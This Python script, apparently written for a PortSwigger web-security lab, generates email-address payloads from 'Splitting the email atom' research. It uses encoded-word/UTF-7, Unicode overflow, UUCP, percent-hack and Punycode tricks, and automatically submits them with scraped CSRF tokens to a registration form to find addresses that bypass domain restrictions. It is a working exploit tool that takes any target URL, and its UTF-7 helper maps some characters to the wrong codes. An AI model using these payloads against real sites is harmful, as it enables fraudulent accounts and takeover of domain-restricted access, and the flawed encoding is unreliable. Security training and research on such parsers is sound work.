#!/usr/bin/env python3
"""
Enhanced Email Parser Vulnerability Testing Tool
Based on the research from "Splitting the email atom" by Gareth Heyes
Added validation functionality to test which payloads actually work
Adjusted to handle complex registration forms with CSRF tokens and additional fields
Example: python3 email-parser-vuln-tester2.py "attacker@exploit-0ad9006903be0a0582ce2eae01d100e0.exploit-server.net" "ginandjuice.shop" --test-url "https://0a6d004c03d90a6b82e22fc400cd00db.web-security-academy.net/register" --success-pattern "Please check your emails for your account registration link" --custom-field "username=tokyo" --custom-field "password=tokyo"
"""

import argparse
import sys
import base64
import requests
import time
import re
import concurrent.futures
from urllib.parse import urlencode
from bs4 import BeautifulSoup

class EmailFuzzer:
    def __init__(self, attacker_email, target_domain):
        self.attacker_email, self.attacker_domain = self._split_email(attacker_email)
        self.target_domain = target_domain
        self.payloads = []
        self.results = {}
        self.session = requests.Session()  # Create a persistent session for all requests
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def _split_email(self, email):
        """Split an email into username and domain parts"""
        parts = email.split('@')
        if len(parts) != 2:
            print(f"Error: Invalid email format: {email}")
            sys.exit(1)
        return parts[0], parts[1]

    def generate_encoded_word_payloads(self):
        """Generate payloads using Q-encoding (Encoded-Word)"""
        # Basic encoded-word probes
        self.payloads.append({
            'name': 'Basic Q-encoding (ISO-8859-1)',
            'payload': f'=?iso-8859-1?q?{self.attacker_email}?=@{self.target_domain}',
            'description': 'Basic Q-encoded email in ISO-8859-1 charset'
        })
        
        self.payloads.append({
            'name': 'Basic Q-encoding (UTF-8)',
            'payload': f'=?utf-8?q?{self.attacker_email}?=@{self.target_domain}',
            'description': 'Basic Q-encoded email in UTF-8 charset'
        })
        
        # UTF-7 encoding which bypasses some filters
        self.payloads.append({
            'name': 'UTF-7 Encoded',
            'payload': f'=?utf-7?q?{self._utf7_encode(self.attacker_email)}?=@{self.target_domain}',
            'description': 'UTF-7 encoded email address - often bypasses filters'
        })
        
        # Encode @ symbol in attacker email
        at_encoded = self.attacker_email.replace('@', '&AEA-')
        self.payloads.append({
            'name': 'UTF-7 with encoded @ symbol',
            'payload': f'=?utf-7?q?{at_encoded}&ACA-?=@{self.target_domain}',
            'description': 'UTF-7 encoding with @ symbol encoded, followed by space'
        })
        
        # Complex examples from the paper
        self.payloads.append({
            'name': 'GitHub style attack',
            'payload': f'=?x?q?{self.attacker_email}=40{self.attacker_domain}=3e=00?=foo@{self.target_domain}',
            'description': 'GitHub style attack with encoded @ (=40), > (=3e), and null (=00)'
        })
        
        self.payloads.append({
            'name': 'Zendesk style attack',
            'payload': f'=?x?q?{self.attacker_email}=40{self.attacker_domain}=22=3c22=3e=00?=foo@{self.target_domain}',
            'description': 'Zendesk style attack with complex encoding pattern'
        })
        
        self.payloads.append({
            'name': 'GitLab style attack (underscore)',
            'payload': f'{self.attacker_email}@{self.attacker_domain}=?utf-8?q?_?=@{self.target_domain}',
            'description': 'GitLab style attack using underscore as encoded space'
        })
        
        self.payloads.append({
            'name': 'GitLab style attack (space)',
            'payload': f'=?iso-8859-1?q?{self.attacker_email}=40{self.attacker_domain}=3e=20?=@{self.target_domain}',
            'description': 'GitLab style attack with encoded @ (=40), > (=3e), and space (=20)'
        })

    def generate_unicode_overflow_payloads(self):
        """Generate payloads using Unicode overflow technique"""
        # Basic unicode overflow for @ symbol (0x40)
        self.payloads.append({
            'name': 'Unicode overflow @ (0x100)',
            'payload': f'{self.attacker_email}{chr(0x100 + 0x40)}{self.attacker_domain}@{self.target_domain}',
            'description': 'Unicode overflow generating @ symbol using codepoint 0x100+0x40'
        })
        
        self.payloads.append({
            'name': 'Unicode overflow @ (0x1000)',
            'payload': f'{self.attacker_email}{chr(0x1000 + 0x40)}{self.attacker_domain}@{self.target_domain}',
            'description': 'Unicode overflow generating @ symbol using codepoint 0x1000+0x40'
        })
        
        # Generate a few more unicode overflows for common symbols
        symbols = {
            '@': 0x40,  # @ symbol
            '>': 0x3e,  # > symbol
            '<': 0x3c,  # < symbol
            ';': 0x3b,  # ; symbol
            '(': 0x28,  # ( symbol
            ')': 0x29   # ) symbol
        }
        
        for sym_name, sym_code in symbols.items():
            self.payloads.append({
                'name': f'Unicode overflow {sym_name} (0x100)',
                'payload': f'{self.attacker_email}{chr(0x100 + sym_code)}{self.attacker_domain}@{self.target_domain}',
                'description': f'Unicode overflow generating {sym_name} symbol using codepoint 0x100+{hex(sym_code)}'
            })

    def generate_uucp_and_percent_attacks(self):
        """Generate UUCP and percent hack attacks"""
        # UUCP style attack
        self.payloads.append({
            'name': 'UUCP attack',
            'payload': f'{self.attacker_domain}!{self.attacker_email}\\@{self.target_domain}',
            'description': 'UUCP protocol attack that may route to a different server'
        })
        
        # Percent hack
        self.payloads.append({
            'name': 'Percent hack',
            'payload': f'{self.attacker_email}%{self.attacker_domain}@{self.target_domain}',
            'description': 'Percent hack that may route via target_domain to attacker_domain'
        })
        
        # Source routes with comments
        self.payloads.append({
            'name': 'Source route with comments',
            'payload': f'{self.attacker_email}%{self.attacker_domain}(@{self.target_domain}',
            'description': 'Source route with comments that may be misinterpreted'
        })

    def generate_punycode_attacks(self):
        """Generate Punycode based attacks"""
        # Basic punycode example
        self.payloads.append({
            'name': 'Basic Punycode example',
            'payload': f'{self.attacker_email}@xn--mnchen-3ya.{self.target_domain}',
            'description': 'Basic Punycode domain (münchen) to test parsing'
        })
        
        # Malformed Punycode examples
        self.payloads.append({
            'name': 'Malformed Punycode (comma)',
            'payload': f'{self.attacker_email}@xn--0049.{self.target_domain}',
            'description': 'Malformed Punycode that may generate a comma'
        })
        
        self.payloads.append({
            'name': 'Malformed Punycode (at symbol)',
            'payload': f'{self.attacker_email}@xn--024.{self.target_domain}',
            'description': 'Malformed Punycode that may generate an @ symbol'
        })

    def generate_combination_attacks(self):
        """Generate combined attack techniques"""
        # Combine UTF-7 with quotes
        self.payloads.append({
            'name': 'UTF-7 with quotes',
            'payload': f'"=?utf-7?q?{self._utf7_encode(self.attacker_email+"@"+self.attacker_domain)}?="@{self.target_domain}',
            'description': 'UTF-7 encoding inside quoted local-part'
        })
        
        # Combine encoded-word with base64
        b64_encoded = base64.b64encode(f'{self.attacker_email}@{self.attacker_domain}'.encode()).decode()
        self.payloads.append({
            'name': 'Base64 encoded-word',
            'payload': f'=?utf-8?b?{b64_encoded}?=@{self.target_domain}',
            'description': 'Base64 encoded email using encoded-word'
        })
        
        # UTF-7 with base64
        b64_encoded = base64.b64encode(f'=?utf-7?q?{self._utf7_encode(self.attacker_email+"@"+self.attacker_domain)}?='.encode()).decode()
        self.payloads.append({
            'name': 'UTF-7 and Base64 combo',
            'payload': f'=?utf-8?b?{b64_encoded}?=@{self.target_domain}',
            'description': 'Complex attack combining UTF-7 and Base64 encoding'
        })

    def _utf7_encode(self, text):
        """Basic UTF-7 encoding for demonstration purposes"""
        # This is a simplified version - for real UTF-7 use a proper library
        result = ""
        for char in text:
            if ord(char) < 128 and char.isalnum():
                result += char
            elif char == '@':
                result += '&AEA-'  # @ in UTF-7
            elif char == ' ':
                result += '&ACA-'  # space in UTF-7
            elif char == '.':
                result += '&ACE-'  # dot in UTF-7
            elif char == '-':
                result += '&ACM-'  # hyphen in UTF-7
            else:
                # Add more special characters as needed
                result += char
        return result

    def generate_all_payloads(self):
        """Generate all payloads"""
        self.generate_encoded_word_payloads()
        self.generate_unicode_overflow_payloads()
        self.generate_uucp_and_percent_attacks()
        self.generate_punycode_attacks()
        self.generate_combination_attacks()
        
        # Generate specific lab solution
        self.payloads.append({
            'name': 'PortSwigger Lab Solution',
            'payload': f'=?utf-7?q?{self.attacker_email}&AEA-{self.attacker_domain}&ACA-?=@{self.target_domain}',
            'description': 'The specific solution for the PortSwigger lab (UTF-7 encoded)'
        })
        
        return self.payloads

    def extract_csrf_token(self, url):
        """Extract CSRF token from the registration page"""
        try:
            response = self.session.get(url, headers=self.headers)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find CSRF token input
            csrf_input = soup.find('input', {'name': 'csrf'})
            if csrf_input and csrf_input.has_attr('value'):
                return csrf_input['value']
            else:
                # Try to find it in other forms of inputs or hidden fields
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for hidden in hidden_inputs:
                    if 'csrf' in hidden.get('name', '').lower() and hidden.has_attr('value'):
                        return hidden['value']
            
            print("[!] Warning: CSRF token not found, using empty value")
            return ""
            
        except Exception as e:
            print(f"[!] Error extracting CSRF token: {str(e)}")
            return ""

    def test_payload(self, payload, target_url, form_data=None, username_prefix="user", success_pattern="Please check your emails", timeout=10):
        """Test a single payload against a target URL with complete form submission"""
        try:
            # Extract CSRF token for each test, but use the same session
            csrf_token = self.extract_csrf_token(target_url)
            
            # Generate a unique username for this test
            timestamp = int(time.time())
            hash_value = hash(payload['payload']) % 10000
            unique_username = f"{username_prefix}_{timestamp}_{hash_value}"
            
            # Prepare form data
            if form_data is None:
                form_data = {}
            
            # Create a copy of form_data to avoid modifying the original
            test_data = form_data.copy()
            
            # Add required fields if not provided
            if 'csrf' not in test_data and csrf_token:
                test_data['csrf'] = csrf_token
            
            if 'username' not in test_data:
                test_data['username'] = unique_username
                
            if 'email' not in test_data:
                test_data['email'] = payload['payload']
                
            if 'password' not in test_data:
                test_data['password'] = 'Password123!'
            
            # Add a small delay between requests to avoid overwhelming the server
            time.sleep(0.5)
            
            # Send POST request using the persistent session
            response = self.session.post(
                target_url, 
                data=test_data, 
                headers=self.headers, 
                timeout=timeout,
                allow_redirects=True  # Follow redirects to capture success page
            )
            
            # Check for success pattern in response
            if response.status_code in [200, 302] and re.search(success_pattern, response.text, re.IGNORECASE):
                return True, f"Success: {response.status_code}"
            else:
                # Check for other potential success indicators
                if 'registration' in response.text.lower() and 'success' in response.text.lower():
                    return True, f"Likely Success: {response.status_code}"
                elif response.status_code == 302:  # Redirect after successful registration
                    # Try to follow the redirect manually
                    redirect_url = response.headers.get('Location')
                    if redirect_url:
                        if not redirect_url.startswith('http'):
                            # Handle relative URLs
                            base_url = '/'.join(target_url.split('/')[:3])  # http(s)://domain.com
                            redirect_url = base_url + redirect_url if redirect_url.startswith('/') else base_url + '/' + redirect_url
                        
                        redirect_response = self.session.get(redirect_url, headers=self.headers, timeout=timeout)
                        if re.search(success_pattern, redirect_response.text, re.IGNORECASE):
                            return True, f"Success after redirect: {response.status_code} -> {redirect_response.status_code}"
                    
                    return True, f"Redirect: {response.status_code}"
                else:
                    return False, f"Failed: {response.status_code}"
        
        except Exception as e:
            return False, f"Error: {str(e)}"

    def test_all_payloads(self, target_url, form_data=None, username_prefix="user", success_pattern="Please check your emails", concurrency=2, timeout=10):
        """Test all payloads against a target URL with concurrency"""
        print(f"\n[*] Testing {len(self.payloads)} payloads against {target_url}")
        print(f"[*] Looking for success pattern: '{success_pattern}'")
        print(f"[*] Using concurrency: {concurrency}")
        
        results = []
        successful_payloads = []
        
        # Reduce concurrency to avoid overwhelming the server
        concurrency = min(concurrency, 2)
        
        # Create a fresh session before testing all payloads
        self.session = requests.Session()
        
        # Test payloads sequentially or with limited concurrency
        if concurrency <= 1:
            # Sequential testing
            for i, payload in enumerate(self.payloads):
                success, message = self.test_payload(
                    payload, target_url, form_data, f"{username_prefix}_{i}", 
                    success_pattern, timeout
                )
                
                status = "✅" if success else "❌"
                results.append({
                    'payload': payload,
                    'success': success,
                    'message': message
                })
                
                print(f"{status} {payload['name']}: {message}")
                
                if success:
                    successful_payloads.append(payload)
                
                # Add a delay between tests
                time.sleep(1)
        else:
            # Limited concurrent testing with batching
            batch_size = 5
            for i in range(0, len(self.payloads), batch_size):
                batch = self.payloads[i:i+batch_size]
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
                    future_to_payload = {
                        executor.submit(
                            self.test_payload, payload, target_url, form_data, f"{username_prefix}_{i+j}", 
                            success_pattern, timeout
                        ): payload for j, payload in enumerate(batch)
                    }
                    
                    for future in concurrent.futures.as_completed(future_to_payload):
                        payload = future_to_payload[future]
                        try:
                            success, message = future.result()
                            
                            status = "✅" if success else "❌"
                            results.append({
                                'payload': payload,
                                'success': success,
                                'message': message
                            })
                            
                            print(f"{status} {payload['name']}: {message}")
                            
                            if success:
                                successful_payloads.append(payload)
                                
                        except Exception as e:
                            print(f"❌ {payload['name']}: Error - {str(e)}")
                
                # Add a delay between batches
                time.sleep(2)
        
        self.results = {
            'total': len(self.payloads),
            'successful': len(successful_payloads),
            'details': results
        }
        
        return self.results

    def print_payloads(self):
        """Print all generated payloads in a formatted way"""
        print(f"\n=== Email Parser Vulnerability Testing Tool ===")
        print(f"Attacker email: {self.attacker_email}@{self.attacker_domain}")
        print(f"Target domain: {self.target_domain}")
        print(f"Generated {len(self.payloads)} payloads\n")
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"{i}. {payload['name']}")
            print(f"   Payload: {payload['payload']}")
            print(f"   Description: {payload['description']}")
            print()
    
    def print_test_results(self):
        """Print test results in a formatted way"""
        if not self.results:
            print("No test results available. Run test_all_payloads() first.")
            return
        
        print(f"\n=== Email Parser Vulnerability Test Results ===")
        print(f"Total payloads tested: {self.results['total']}")
        print(f"Successful payloads: {self.results['successful']} ({(self.results['successful'] / self.results['total']) * 100:.2f}%)")
        print("\n=== Successful Payloads ===")
        
        successful = [r for r in self.results['details'] if r['success']]
        for i, result in enumerate(successful, 1):
            payload = result['payload']
            print(f"{i}. {payload['name']}")
            print(f"   Payload: {payload['payload']}")
            print(f"   Description: {payload['description']}")
            print(f"   Status: Success ({result['message']})")
            print()
    
    def save_results(self, output_file):
        """Save test results to a file"""
        if not self.results:
            print("No test results available. Run test_all_payloads() first.")
            return
        
        with open(output_file, 'w') as f:
            f.write("=== Email Parser Vulnerability Test Results ===\n")
            f.write(f"Attacker email: {self.attacker_email}@{self.attacker_domain}\n")
            f.write(f"Target domain: {self.target_domain}\n")
            f.write(f"Total payloads tested: {self.results['total']}\n")
            f.write(f"Successful payloads: {self.results['successful']} ({(self.results['successful'] / self.results['total']) * 100:.2f}%)\n\n")
            
            f.write("=== Successful Payloads ===\n")
            successful = [r for r in self.results['details'] if r['success']]
            for i, result in enumerate(successful, 1):
                payload = result['payload']
                f.write(f"{i}. {payload['name']}\n")
                f.write(f"   Payload: {payload['payload']}\n")
                f.write(f"   Description: {payload['description']}\n")
                f.write(f"   Status: Success ({result['message']})\n\n")
            
            f.write("=== All Payloads ===\n")
            for i, result in enumerate(self.results['details'], 1):
                payload = result['payload']
                status = "Success" if result['success'] else "Failed"
                f.write(f"{i}. {payload['name']}\n")
                f.write(f"   Payload: {payload['payload']}\n")
                f.write(f"   Description: {payload['description']}\n")
                f.write(f"   Status: {status} ({result['message']})\n\n")
                
        print(f"Results saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Test email parser vulnerabilities with payload validation')
    parser.add_argument('attacker_email', help='Attacker email address (e.g., attacker@example.com)')
    parser.add_argument('target_domain', help='Target domain to bypass (e.g., company.com)')
    parser.add_argument('--test-url', '-u', help='URL to test payloads against (for validation)')
    parser.add_argument('--username', help='Username to use for registration', default='testuser')
    parser.add_argument('--password', help='Password to use for registration', default='Password123!')
    parser.add_argument('--custom-field', '-cf', action='append', help='Custom form fields in format name=value', default=[])
    parser.add_argument('--success-pattern', '-p', help='Pattern to look for in successful responses', 
                        default='Please check your emails')
    parser.add_argument('--concurrency', '-c', help='Number of concurrent requests', type=int, default=1)
    parser.add_argument('--timeout', '-t', help='Request timeout in seconds', type=int, default=15)
    parser.add_argument('--output', '-o', help='Output file to save payloads and results', default=None)
    
    args = parser.parse_args()
    
    # Split attacker email if provided as full email
    attacker_email = args.attacker_email
    if '@' not in attacker_email:
        print(f"Error: Attacker email must include @ symbol")
        sys.exit(1)
    
    # Initialize fuzzer
    fuzzer = EmailFuzzer(attacker_email, args.target_domain)
    
    # Generate all payloads
    fuzzer.generate_all_payloads()
    
    # Print payloads
    fuzzer.print_payloads()
    
    # Test payloads if URL is provided
    if args.test_url:
        # Parse custom form fields
        form_data = {
            'username': args.username,
            'password': args.password
        }
        
        for field in args.custom_field:
            if '=' in field:
                name, value = field.split('=', 1)
                form_data[name] = value
            
        fuzzer.test_all_payloads(
            args.test_url,
            form_data=form_data,
            username_prefix=args.username,
            success_pattern=args.success_pattern,
            concurrency=args.concurrency,
            timeout=args.timeout
        )
        fuzzer.print_test_results()
    
    # Save to file if requested
    if args.output:
        if args.test_url:
            fuzzer.save_results(args.output)
        else:
            with open(args.output, 'w') as f:
                f.write("Email Parser Vulnerability Testing Tool\n")
                f.write(f"Attacker email: {attacker_email}\n")
                f.write(f"Target domain: {args.target_domain}\n\n")
                
                for i, payload in enumerate(fuzzer.payloads, 1):
                    f.write(f"{i}. {payload['name']}\n")
                    f.write(f"   Payload: {payload['payload']}\n")
                    f.write(f"   Description: {payload['description']}\n\n")
                    
            print(f"Payloads saved to {args.output}")

if __name__ == "__main__":
    main()
